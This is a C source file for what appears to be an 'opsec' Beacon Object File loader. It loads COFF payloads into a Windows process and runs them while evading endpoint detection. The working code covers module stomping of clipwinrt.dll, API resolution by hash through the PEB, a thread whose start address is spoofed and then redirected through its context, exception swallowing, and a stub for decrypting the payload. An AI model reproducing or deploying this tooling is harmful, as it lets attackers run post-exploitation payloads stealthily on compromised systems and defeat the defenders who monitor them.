#include "OpsecCoffLdr.h"

int main(INT argc ,CHAR **argv)
{
	CHAR*	szBofEntryPoint 	= NULL;
	PBYTE	pbBofBuffer		= NULL;
	PVOID   pvNextBase		= NULL;
	PVOID	pvBofArgBuf		= NULL;
	DWORD	dwBofArgSize		= 0;
	DWORD   dwBofSize		= 0;
	PCOFFEE pCoffee			= NULL;
	hProcessHeap			= GetProcessHeap();

	if (!LdrResolveFunction()) goto _CleanUp;
	else			   printf("[+] Ldr Resolve Function Successfully \n");

#ifdef _DEBUG
	szBofEntryPoint = "go";
	ReadPayLoad(&pbBofBuffer, &dwBofSize, "C:\\Users\\test\\Desktop\\badger.obj");
	//BofPack(&pvBofArgBuf, &dwBofArgSize, argv);
#else 
	if (argc < 3)
	{
		printf("%s C:\\Users\\test\\Desktop\\badger.obj entrypoint argumentSize arg1 arg2 ...\n",argv[0]);
		return 0;
	}

	szBofEntryPoint = argv[2];
	ReadPayLoad(&pbBofBuffer, &dwBofSize, argv[1]);
	if(argv[3] != NULL && atoi(argv[3]) > 0) BofPack(&pvBofArgBuf, &dwBofArgSize, argv);
#endif
	
	pCoffee				= HeapAlloc(hProcessHeap, HEAP_ZERO_MEMORY, sizeof(COFFEE));
	pCoffee->Data			= pbBofBuffer;
	pCoffee->Header			= pCoffee->Data;
	pCoffee->Symbol			= (LPVOID)((ULONG_PTR)(pCoffee->Data) + pCoffee->Header->PointerToSymbolTable);
	pCoffee->SecMap			= HeapAlloc(hProcessHeap, HEAP_ZERO_MEMORY, pCoffee->Header->NumberOfSections * sizeof(SECTION_MAP));

	if (pCoffee->Header->Machine != IMAGE_FILE_MACHINE_AMD64)
	{
		printf("BOF Is Not AMD64 :(\n");
		goto _CleanUp;
	}

	pCoffee->GOTSize = ParseTotalSize(pCoffee, &pCoffee->BofSize,&pCoffee->BSSSize);
	
	printf("[+] BOF Total Size %d , GOT Table Size %d , BSS Table Size %d\n", pCoffee->BofSize, pCoffee->GOTSize,pCoffee->BSSSize);
	
	pCoffee->ImageBase = CoffeeModuleStomping(pCoffee->BofSize);

	if (!pCoffee->ImageBase)
	{
		printf("Virtual Alloc Bof Buffer Failed :(\n");
		goto _CleanUp;
	}
	else
	{
		pvNextBase = pCoffee->ImageBase;
		printf("[+] Alloc Bof Buffer Success %p\n", pCoffee->ImageBase);
	}

	for (DWORD dwSecCnt = 0; dwSecCnt < pCoffee->Header->NumberOfSections; dwSecCnt++)
	{
		pCoffee->Section		= (PVOID)(((ULONG_PTR)pCoffee->Data) + sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * dwSecCnt));
		pCoffee->SecMap[dwSecCnt].Size	= pCoffee->Section->SizeOfRawData;
		pCoffee->SecMap[dwSecCnt].Ptr	= pvNextBase;

		((ULONG_PTR)pvNextBase) += pCoffee->Section->SizeOfRawData;
		((ULONG_PTR)pvNextBase)	= PAGE_ALLIGN(pvNextBase);

		_Memcpy(pCoffee->SecMap[dwSecCnt].Ptr, (PVOID)((ULONG_PTR)pCoffee->Data + pCoffee->Section->PointerToRawData), pCoffee->Section->SizeOfRawData);
	}

	pCoffee->GOT		= pvNextBase;
	pCoffee->BSS		= (PVOID)((ULONG_PTR)pvNextBase + pCoffee->GOTSize);

	if (dwBssEntryNum) // init Bss Entry
	{
		for (DWORD dwCnt = 0; dwCnt < dwBssEntryNum; dwCnt++)
		{
			BssEntry[dwCnt].pvSysmbolAddr	= NULL;
			BssEntry[dwCnt].stOffset	= 0;
		}
	}

	if (!CoffeeProcessSection(pCoffee))
	{	
		printf("[-] Process Coff Section Failed :(\n");
		goto _CleanUp;
	}
	else
	{
		printf("[+] Process Coffee Section Success \n");
	}

	RunCoff(pCoffee, szBofEntryPoint,pvBofArgBuf,dwBofArgSize);

_CleanUp:
	printf("END : \\O/ ");
	if (pCoffee->ImageBase) VirtualFree(pCoffee->ImageBase, 0, MEM_RELEASE);
	if (pCoffee->SecMap)	HEAPSECUREFREE(pCoffee->SecMap, pCoffee->Header->NumberOfSections * sizeof(SECTION_MAP));
	if (pCoffee)		HEAPSECUREFREE(pCoffee, sizeof(COFFEE));
	if (pbBofBuffer)	HEAPSECUREFREE(pbBofBuffer, dwBofSize);
	return 0;
}

// New Format :P	 
// (Uint32)  (Uint32)      (Uint32)  
// totalsize arg1size arg1 arg2size arg2 ... 
VOID BofPack(PVOID* pvBofArgBuf, DWORD* pdwBofArgSize, CHAR** argv)
{
	Arg	  arg[MAXARGNUM] 	= { 0 };
	DWORD dwTotalSizeOffset 	= 4;
	for (DWORD dwCnt = 0; dwCnt < atoi(argv[3]); dwCnt++)
	{
		if (!argv[4 + dwCnt]) { printf("Failed To Get Param %d,exit ...", dwCnt + 1); exit(0); }
		if (IsDigit(argv[4 + dwCnt]) == TRUE)
		{
			arg[dwCnt].length 	= sizeof(UINT32);
			arg[dwCnt].num 		= atoi(argv[4 + dwCnt]);
			_Memcpy(arg[dwCnt].buffer, &arg[dwCnt].num, 4);
		}
		else
		{
			arg[dwCnt].length = StringLengthA(argv[4 + dwCnt] ) + 1;
			_Memcpy(arg[dwCnt].buffer, argv[4 + dwCnt], StringLengthA(argv[4 + dwCnt]));
		}
		*pdwBofArgSize += (arg[dwCnt].length + sizeof(UINT32));
	}
	*pdwBofArgSize += sizeof(UINT32);

	*pvBofArgBuf = (PVOID)HeapAlloc(hProcessHeap, HEAP_ZERO_MEMORY,*pdwBofArgSize);

	for (DWORD dwCnt = 0; dwCnt < atoi(argv[3]); dwCnt++)
	{
		_Memcpy((char*)*pvBofArgBuf + dwTotalSizeOffset, &arg[dwCnt].length, sizeof(UINT32));
		dwTotalSizeOffset += sizeof(UINT32);

		_Memcpy((char*)*pvBofArgBuf + dwTotalSizeOffset, arg[dwCnt].buffer, arg[dwCnt].length);
		dwTotalSizeOffset += arg[dwCnt].length;
	}

	_Memcpy(*pvBofArgBuf,&dwTotalSizeOffset, sizeof(UINT32));
}

PVOID CoffeeModuleStomping(DWORD dwSize)
{
	HANDLE				hStompModule		= INVALID_HANDLE_VALUE;
	PVOID				pvBofBuffer		= NULL;
	SIZE_T				stBofSize		= dwSize;
	ULONG				uNewProtect		= PAGE_READWRITE;
	ULONG				uOldProtect		= 0;
	ULONG				uFlags			= 0x2;
	DWORD				dwModuleHash		= HashEx(TARGETMODULE, StringLengthA(TARGETMODULE), TRUE);
	UNICODE_STRING			usDllPath		= { 0 };

	if (!GetModuleByPeb(dwModuleHash))
	{
		_RtlInitUnicodeString(&usDllPath, L"clipwinrt.dll");
		win32Api.pfnLdrLoadDll(NULL, &uFlags, &usDllPath, &hStompModule);
		if (!hStompModule || hStompModule == INVALID_HANDLE_VALUE)
		{
			if (win32Api.pfnNtAllocateVirtualMemory((HANDLE)-1, &pvBofBuffer, 0, &stBofSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) == ERROR_SUCCESS)
			{
				printf("[+] NtAllocate Virtual Memory Size %d\n", stBofSize);
			}
			return pvBofBuffer;
		}
		else 
		{
			pvBofBuffer		= hStompModule;

			if (win32Api.pfnNtProtectVirtualMemory((HANDLE)-1, &pvBofBuffer, &stBofSize, uNewProtect, &uOldProtect) == ERROR_SUCCESS)
			{
				_Memset(pvBofBuffer, 0, stBofSize);
				printf("[+] Stomping %s %p \n", TARGETMODULE, pvBofBuffer);
				return pvBofBuffer;
			}
			else return NULL;
		}
	}

}

VOID HitCoffeeEntryPoint(PVOID pvCoffeeEntryPoint,PVOID pvArgument,DWORD dwArgSize)
{
	HANDLE		hThread			= INVALID_HANDLE_VALUE; 
	HANDLE		hThreadToken		= INVALID_HANDLE_VALUE;
	CONTEXT		ctx			= {0};
	OBJECT_ATTRIBUTES objAttr		= {0};
	ctx.ContextFlags			= CONTEXT_ALL;

	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

	if (!win32Api.pfnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &objAttr, (HANDLE)-1, win32Api.ulTpReleaseCleanupGroupMembers + 0x450, NULL, TRUE, 1024 * 1024, 0, 0, NULL))
	{
		if (win32Api.pfnNtGetContextThread(hThread, &ctx))	__fastfail(0xc00000022);
		
		ctx.Rip = pvCoffeeEntryPoint;
		ctx.Rcx = pvArgument;
		ctx.Rdx = dwArgSize;
		ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = 0;
		*(ULONG_PTR*)(ctx.Rsp) = (ULONG_PTR)win32Api.pfnRtlExitUserThread;
	
		if (win32Api.pfnNtSetContextThread(hThread, &ctx))	__fastfail(0xc00000022);
		if (win32Api.pfnNtResumeThread(hThread, 0))		__fastfail(0xc00000022);
		printf("[+] Hit Bof Entry %p \n", pvCoffeeEntryPoint);
	}

	win32Api.pfnNtWaitForSingleObject(hThread, FALSE, NULL);
}


VOID RunCoff(PCOFFEE pCoffee,CHAR* szBofEntryPoint, PVOID pvArgument,DWORD dwArgSize)
{
	
	DWORD	dwCnt					= 0;
	PVOID	pvCoffeeEntryPoint			= NULL;
	HANDLE	hVeh					= INVALID_HANDLE_VALUE;

	for (;dwCnt < pCoffee->Header->NumberOfSymbols; dwCnt++)
	{
		pCoffee->Section = (PVOID)((ULONG_PTR)(pCoffee->Data) + sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * dwCnt));

		if (_Strcmp(pCoffee->Symbol[dwCnt].First.Name, szBofEntryPoint) == 0)
		{
			pvCoffeeEntryPoint = (PVOID)(pCoffee->SecMap[pCoffee->Symbol[dwCnt].SectionNumber - 1].Ptr + pCoffee->Symbol[dwCnt].Value);
			printf("[+] Bof Entry Point : %s \n", szBofEntryPoint);
			dwCnt = 0;
			break;
		}
	}
	dwCnt = 0;

	while (TRUE)
	{
		pCoffee->Section = (PVOID)(((ULONG_PTR)pCoffee->Data) + sizeof(COFF_FILE_HEADER) + (ULONG_PTR)(sizeof(COFF_SECTION) * dwCnt));
		if (HashEx(pCoffee->Section->Name, COFF_PREP_TEXT_SIZE, FALSE) == COFF_PREP_TEXT)
		{
			win32Api.pfnNtProtectVirtualMemory((HANDLE) - 1,&pCoffee->SecMap[dwCnt].Ptr,&pCoffee->SecMap[dwCnt].Size, PAGE_EXECUTE_READ, &dwCnt);
			break;
		}
		dwCnt++;
	}

	if (!pvCoffeeEntryPoint)
	{
		printf("Failed To Find Entry Point %s , exit ...\n",szBofEntryPoint);
		return;
	}

	printf("[+] Register Veh Handler ...\n");

	hVeh = win32Api.pfnRtlAddVectoredExceptionHandler(0, &VectoredExceptionHandler);

	HitCoffeeEntryPoint(pvCoffeeEntryPoint, pvArgument, dwArgSize);

	if(hVeh) win32Api.pfnRtlRemoveVectoredExceptionHandler(hVeh);

	return;
}


BOOL CoffeeProcessSection(PCOFFEE pCoffee)
{
	CHAR         szSymName[9]		= { 0 };
	PCHAR        pSymbolName		= NULL;
	DWORD        dwNumberOfFunc		= 0;
	PVOID		 pvRelocAddr		= NULL;
	PVOID	     pvSymbolSecAddr		= NULL;
	PCOFF_SYMBOL pCoffSymbol		= NULL;
	PVOID		 pvBssTableAddr		= pCoffee->BSS;
	
	for (DWORD dwSectionCnt = 0; dwSectionCnt < pCoffee->Header->NumberOfSections; dwSectionCnt++)
	{
		pCoffee->Section = (PVOID)(((ULONG_PTR)pCoffee->Data) + sizeof(COFF_FILE_HEADER) + ((ULONG_PTR)(sizeof(COFF_SECTION) * dwSectionCnt)));
		pCoffee->Reloc = (PVOID)(((ULONG_PTR)pCoffee->Data) + pCoffee->Section->PointerToRelocations);

		for (DWORD dwRelocCnt = 0; dwRelocCnt < pCoffee->Section->NumberOfRelocations; dwRelocCnt++)
		{
			PVOID	pvFunctionPtr		= NULL;
			DWORD	dwBssEntryOffset	= 0;

			pCoffSymbol = &pCoffee->Symbol[pCoffee->Reloc->SymbolTableIndex];

			if (pCoffSymbol->First.Value[0] != 0)
			{
				_Memset(szSymName, 0, sizeof(szSymName));
				_Memcpy(szSymName, pCoffSymbol->First.Name, 8);
				pSymbolName = szSymName;
			}
			else
			{
				pSymbolName = (PCHAR)(((ULONG_PTR)pCoffee->Symbol + pCoffee->Header->NumberOfSymbols * 0x12) + (ULONG_PTR)pCoffSymbol->First.Value[1]);
			}

			pvRelocAddr = pCoffee->SecMap[dwSectionCnt].Ptr + pCoffee->Reloc->VirtualAddress;
			pvSymbolSecAddr = pCoffee->SecMap[pCoffSymbol->SectionNumber - 1].Ptr;

			if ((pCoffSymbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL) && pCoffSymbol->SectionNumber == 0x0)
			{
				if (!CoffeeProcessSymbol(pSymbolName, pCoffSymbol, &pvFunctionPtr,&dwBssEntryOffset))
				{
					printf("[-] Failed To Resolve Symbol %s :(\n", pSymbolName);
					return FALSE;
				}
			}

#if _WIN64

			UINT64 OffsetLong = 0;
			UINT32 Offset = 0;

			if (pCoffee->Reloc->Type == IMAGE_REL_AMD64_REL32 && pvFunctionPtr != NULL)
			{
				pCoffee->GOT[dwNumberOfFunc] = pvFunctionPtr;

				Offset = (UINT32)((ULONG_PTR)(&pCoffee->GOT[dwNumberOfFunc]) - (ULONG_PTR)(pvRelocAddr) -sizeof(UINT32));

				*((PUINT32)pvRelocAddr) = Offset;

				dwNumberOfFunc++;
			}
			else
			{
				if (pCoffee->Reloc->Type >= IMAGE_REL_AMD64_REL32 && pCoffee->Reloc->Type <= IMAGE_REL_AMD64_REL32_5)
				{
					if (!pvFunctionPtr && dwBssEntryOffset) // remember the usage of 0x4
					{
						Offset = (UINT32)(((ULONG_PTR)pCoffee->BSS + dwBssEntryOffset) - (ULONG_PTR)(pCoffee->Reloc->Type - 4)  - ((ULONG_PTR)pvRelocAddr + 4));
					}
					else if ((pCoffSymbol->StorageClass == IMAGE_SYM_CLASS_STATIC && pCoffSymbol->Value != 0) || (pCoffSymbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL && pCoffSymbol->SectionNumber != 0x0))
					{
						Offset = pCoffSymbol->Value;
						Offset += (ULONG_PTR)(pvSymbolSecAddr)-(ULONG_PTR)(pvRelocAddr)-sizeof(UINT32) - (ULONG_PTR)(pCoffee->Reloc->Type - 4);
					}
					else
					{
						Offset = *(PUINT32)(pvRelocAddr);

						Offset += (ULONG_PTR)(pvSymbolSecAddr)-(ULONG_PTR)(pvRelocAddr)-sizeof(UINT32) - (ULONG_PTR)(pCoffee->Reloc->Type - 4);
					}

					*((PUINT32)pvRelocAddr) = Offset;
				}
				else if (pCoffee->Reloc->Type == IMAGE_REL_AMD64_ADDR32NB)
				{
					if (!pvFunctionPtr && dwBssEntryOffset) // remember the usage of 0x4
					{
						Offset = (UINT32)(((ULONG_PTR)pCoffee->BSS + dwBssEntryOffset) - ((ULONG_PTR)pvRelocAddr + 4));
					}
					else if ((pCoffSymbol->StorageClass == IMAGE_SYM_CLASS_STATIC && pCoffSymbol->Value != 0) || (pCoffSymbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL && pCoffSymbol->SectionNumber != 0x0))
					{
						Offset = pCoffSymbol->Value;
						Offset += (ULONG_PTR)(pvSymbolSecAddr)-(ULONG_PTR)(pvRelocAddr)-sizeof(UINT32);
					}
					else
					{
						Offset = *(PUINT32)(pvRelocAddr);
						Offset += (ULONG_PTR)(pvSymbolSecAddr)-(ULONG_PTR)(pvRelocAddr)-sizeof(UINT32);
					}

					*((PUINT32)pvRelocAddr) = Offset;
				}
				else if (pCoffee->Reloc->Type == IMAGE_REL_AMD64_ADDR64)
				{
					if (!pvFunctionPtr && dwBssEntryOffset) // remember the usage of 0x4
					{
						OffsetLong = ((ULONG_PTR)pCoffee->BSS + dwBssEntryOffset) - ((ULONG_PTR)pvRelocAddr + 4);
					}
					else if ((pCoffSymbol->StorageClass == IMAGE_SYM_CLASS_STATIC && pCoffSymbol->Value != 0) || (pCoffSymbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL && pCoffSymbol->SectionNumber != 0x0))
					{
						OffsetLong = pCoffSymbol->Value;
						OffsetLong += (ULONG_PTR)(pvSymbolSecAddr);
					}
					else
					{
						OffsetLong = *(PUINT64)(pvRelocAddr);
						OffsetLong += (ULONG_PTR)(pvSymbolSecAddr);
					}

					*((PUINT64)pvRelocAddr) = OffsetLong;
				}
			}

#endif
			pCoffee->Reloc = (PVOID)((ULONG_PTR)pCoffee->Reloc + sizeof(COFF_RELOC));
		}

	}
	return TRUE;
}


// 1.parseBeacon Api 2.parselibrary$api // 3.parse .bss 
BOOL CoffeeProcessSymbol(PCHAR pSymbolName, PCOFF_SYMBOL pCoffSymbol,PVOID *pvFunctionAddr,PDWORD pdwBssAddr)
{
	CHAR		szSymbolName[1024]	= { 0 };
	CHAR*		libraryName		= NULL;
	CHAR*		functionName		= NULL;
	CHAR*		symbolName		= NULL;
	DWORD		dwBeaconNameHash	= 0;

	_Memset(szSymbolName, 0, 1024);
	dwBeaconNameHash = HashEx(pSymbolName, COFF_PREP_BEACON_SIZE, FALSE);

	if (dwBeaconNameHash == COFF_PREP_BEACON) // __imp_Beacon
	{
		symbolName = pSymbolName + COFF_PREP_SYMBOL_SIZE;

		for (DWORD i = 0;; i++)
		{
			if (!BeaconApi[i].NameHash)
				break;

			if (HashEx(symbolName,StringLengthA(symbolName),FALSE) == BeaconApi[i].NameHash)
			{
				*pvFunctionAddr = BeaconApi[i].Pointer;
				return TRUE;
			}
		}

		printf("Beacon Symbol %s Not Found :(\n");
		return FALSE;
	}
	else if (HashEx(pSymbolName, COFF_PREP_SYMBOL_SIZE, FALSE) == COFF_PREP_SYMBOL) // __imp_libraryName$functionName , __imp_functionNae
	{
		BOOL				bIsStandardFormat	= FALSE;
		DWORD				dwLibraryNameHash	= 0;
		ULONG				uFlags			= 0x2;
		HMODULE				hModule			= INVALID_HANDLE_VALUE;
		ANSI_STRING			AnsiString		= { 0 };
		UNICODE_STRING		usDllPath			= { 0 };

		for (DWORD dwCnt = 0;dwCnt < StringLengthA(pSymbolName); dwCnt++)
		{
			if (pSymbolName[dwCnt] == '$') 
			{
				bIsStandardFormat = TRUE;
				break;
			}
		}

		libraryName					= pSymbolName + COFF_PREP_SYMBOL_SIZE;
		libraryName					= StringTokenA(libraryName, "$");
		functionName					= libraryName + StringLengthA(libraryName) + 1;
		dwLibraryNameHash				= HashEx(libraryName, StringLengthA(libraryName), TRUE);

		if (bIsStandardFormat)
		{
			hModule					= GetModuleByPeb(dwLibraryNameHash);
			if (!hModule)hModule			= LoadLibraryA(libraryName);  // But I Have A Valid CallStack :P

			_Memcpy(szSymbolName, functionName, StringLengthA(functionName));
			
			AnsiString.Length			= StringLengthA(functionName);
			AnsiString.MaximumLength		= AnsiString.Length + sizeof(CHAR);
			AnsiString.Buffer			= szSymbolName;
			
			win32Api.pfnLdrGetProcedureAddress(hModule, &AnsiString, 0, pvFunctionAddr);
			return TRUE;
		}
		else // I try my best :P
		{
			for (DWORD i = 0;; i++)
			{
				if (!LdrApi[i].NameHash)
					break;

				if (HashEx(libraryName, StringLengthA(libraryName), FALSE) == LdrApi[i].NameHash)
				{
					*pvFunctionAddr = LdrApi[i].Pointer;
					return TRUE;
				}
			}
		}
	}
	else // .bss 
	{
		DWORD dwSum = 0;  // GetEntry Offset 
		for (DWORD dwCnt = 0; dwCnt < dwBssEntryNum; dwCnt++)
		{
			if (BssEntry[dwCnt].pvSysmbolAddr == (PVOID)pCoffSymbol)  // Found Entry 
			{
				break;
			}
			else if (BssEntry[dwCnt].pvSysmbolAddr == NULL && BssEntry[dwCnt].stOffset == 0) // Not Documented 
			{
				BssEntry[dwCnt].stOffset = pCoffSymbol->Value;
				BssEntry[dwCnt].pvSysmbolAddr = (PVOID)pCoffSymbol;
				break;
			}
			else
			{
				dwSum += BssEntry[dwCnt].stOffset; // Get Offset 
			}
		}

		*pdwBssAddr = (ULONG_PTR)*pdwBssAddr + dwSum + 0x4; // Now 0x4 's mean should be clear
		return TRUE;
	}

	return FALSE;
}


SIZE_T ParseTotalSize(PCOFFEE pCoffee,SIZE_T* stTotalSize,PSIZE_T pstBSSSize)
{
	CHAR         szSymName[9]		= { 0 };
	PCHAR        pSymbolName		= NULL;
	DWORD        dwNumberOfFunc		= 0;
	PCOFF_SYMBOL pCoffSymbol		= NULL;
	*stTotalSize				= 0;
	*pstBSSSize				= 0;

	for (DWORD dwSectionCnt = 0; dwSectionCnt < pCoffee->Header->NumberOfSections; dwSectionCnt++)
	{
		pCoffee->Section	= (PVOID)(((ULONG_PTR)pCoffee->Data) + sizeof(COFF_FILE_HEADER) + ((ULONG_PTR)(sizeof(COFF_SECTION) * dwSectionCnt)));
		pCoffee->Reloc		= (PVOID)(((ULONG_PTR)pCoffee->Data) + pCoffee->Section->PointerToRelocations);

		*stTotalSize  += pCoffee->Section->SizeOfRawData;
		*stTotalSize  = (SIZE_T)((ULONG_PTR)PAGE_ALLIGN(*stTotalSize));

		for (DWORD dwRelocCnt = 0; dwRelocCnt < pCoffee->Section->NumberOfRelocations; dwRelocCnt++)
		{
	
			pCoffSymbol = &pCoffee->Symbol[pCoffee->Reloc->SymbolTableIndex];

			if (pCoffSymbol->First.Value[0] != 0)
			{
				_Memset(szSymName, 0, sizeof(szSymName));
				_Memcpy(szSymName, pCoffSymbol->First.Name, 8);
				pSymbolName = szSymName;
			}
			else
			{
				pSymbolName = ((PCHAR)(pCoffee->Symbol + pCoffee->Header->NumberOfSymbols)) + pCoffSymbol->First.Value[1];
			}

			if (pCoffSymbol->StorageClass == IMAGE_SYM_CLASS_EXTERNAL && pCoffSymbol->SectionNumber == 0x0)
			{
				if (HashEx(pSymbolName, COFF_PREP_SYMBOL_SIZE, FALSE) == COFF_PREP_SYMBOL)
					dwNumberOfFunc++;
				else
				{
					*pstBSSSize += pCoffSymbol->Value;
					dwBssEntryNum++;
				}
					
			}
		

			pCoffee->Reloc = (PVOID)((ULONG_PTR)pCoffee->Reloc + sizeof(COFF_RELOC));
		}

	}

	*stTotalSize += sizeof(PVOID) * dwNumberOfFunc;
	*stTotalSize += *pstBSSSize;
	*stTotalSize += 0x4; // skip Bss 0x4 for flag , it will be clear in process sysmbol  

	return sizeof(PVOID) * dwNumberOfFunc;
}


LONG VectoredExceptionHandler(EXCEPTION_POINTERS* pExceptionInfo)
{
	if (pExceptionInfo->ExceptionRecord->ExceptionCode == 0xC0000005 || pExceptionInfo->ExceptionRecord->ExceptionCode == 0xC0000094)
	{
		printf("[!] Oops Bof Caused Exception, Redirecting ... :(\n");
		pExceptionInfo->ContextRecord->Rip = (PVOID)ExitThread;
		pExceptionInfo->ContextRecord->Rcx = 0;
	}
	else if (pExceptionInfo->ExceptionRecord->ExceptionCode == 0xE06D7363) // Some BOF Will Cause System Exception , we Need To Let it Go :P
	{
		return EXCEPTION_CONTINUE_SEARCH;
	}
	return EXCEPTION_CONTINUE_EXECUTION;
}


BOOL ReadPayLoad(PBYTE* pbBofBuffer, PDWORD pdwBofSize, CHAR* szBofPath)
{
	BOOL        bRet = FALSE;
	HANDLE		hFile = INVALID_HANDLE_VALUE;
	DWORD		dwFileSize = 0;
	PVOID		pvBofBuffer = NULL;
	DWORD		dwNumberOfBytesRead = 0;

	hFile = win32Api.pfnCreateFileA(szBofPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE || !hFile)
		goto _FUNC_CLEANUP;

	if ((dwFileSize = win32Api.pfnGetFileSize(hFile, NULL)) == INVALID_FILE_SIZE)
		goto _FUNC_CLEANUP;

	pvBofBuffer = HeapAlloc(hProcessHeap, HEAP_ZERO_MEMORY, dwFileSize);

	if (!pvBofBuffer)
		goto _FUNC_CLEANUP;

	if (!win32Api.pfnReadFile(hFile, pvBofBuffer, dwFileSize, &dwNumberOfBytesRead, NULL) || dwFileSize != dwNumberOfBytesRead)
		goto _FUNC_CLEANUP;

	// Decrypt? ReplaceMe :)
	//unsigned char	s[256]		= { 0x29 ,0x23 ,0xBE ,0x84 ,0xE1 ,0x6C ,0xD6 ,0xAE ,0x00 };
	//char		key[256]	= { 0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 };

	//RC4Init(s, key, (unsigned long)strlen(key));
	//RC4Crypt(s, pvShellcodeBuffer, dwFileSize);

	printf("[+] Read File Successfully, Size %d \n", dwFileSize);

	*pbBofBuffer = (PBYTE)pvBofBuffer;
	*pdwBofSize = dwFileSize;
	bRet = TRUE;

_FUNC_CLEANUP:

	if (hFile)
		win32Api.pfnCloseHandle(hFile);

	return bRet;
}
